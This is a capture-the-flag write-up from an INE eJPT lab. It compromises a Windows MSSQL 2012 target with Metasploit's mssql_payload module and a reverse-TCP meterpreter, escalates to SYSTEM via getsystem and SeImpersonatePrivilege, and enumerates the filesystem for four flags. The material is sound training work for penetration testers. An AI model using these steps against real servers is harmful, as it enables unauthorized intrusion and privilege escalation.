# Metasploit Framework CTF 1 (Windows) - INE eJPT

INE CTF against a Windows target running Microsoft SQL Server 2012. Initial access via MSSQL RCE, privilege escalation using `getsystem` after confirming SeImpersonatePrivilege, then filesystem enumeration to recover four flags.

Target: `target.ine.local` (Windows - MSSQL on port 1433)

---

## Reconnaissance

```bash
service postgresql start
msfconsole -q
db_status
db_nmap -p 1433 -sV -sC -O --osscan-guess target.ine.local
```

Port 1433 open - Microsoft SQL Server 2012.

---

## Exploitation - MSSQL RCE

```bash
use exploit/windows/mssql/mssql_payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set RHOSTS target.ine.local
run
```

Meterpreter session obtained as the `MSSQLSERVER` service account.

## Flag 1

```bash
shell
cd C:\
dir
type flag1.txt
```

---

## Privilege Escalation

```bash
getprivs
```

`SeImpersonatePrivilege` present.

```bash
getsystem
```

SYSTEM privileges obtained.

## Flag 2 - System32\config Directory

```bash
shell
cd C:\Windows\System32\config
dir
type flag2.txt
```

---

## Flag 3 - Hidden File in System32

Recursive search for `.txt` files:

```bash
dir C:\Windows\System32\*.txt /s /b
```

Hidden file located:

```
C:\Windows\System32\drivers\escaltePrivilegeToGetThisFlag.txt
```

```bash
type C:\Windows\System32\drivers\escaltePrivilegeToGetThisFlag.txt
```

## Flag 4 - Administrator Desktop

```bash
cd C:\Users\Administrator\Desktop
dir
type flag4.txt
```

---

## Key Takeaways

- SQL Server on port 1433 is a high-value initial access target in Windows environments. The `mssql_payload` module handles authentication and payload delivery in one step.
- `SeImpersonatePrivilege` is typically assigned to SQL Server service accounts. Its presence makes `getsystem` reliable - it abuses token impersonation to reach SYSTEM.
- `getsystem` tries multiple escalation techniques automatically. When `SeImpersonatePrivilege` is present, the named pipe impersonation technique succeeds without any additional setup.
- Post-exploitation on Windows is a filesystem enumeration exercise. Directories that deny access before `getsystem` become readable after - always retry enumeration after escalation.
- The `db_nmap` command integrates scan results into the Metasploit database for session and loot tracking across the engagement.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
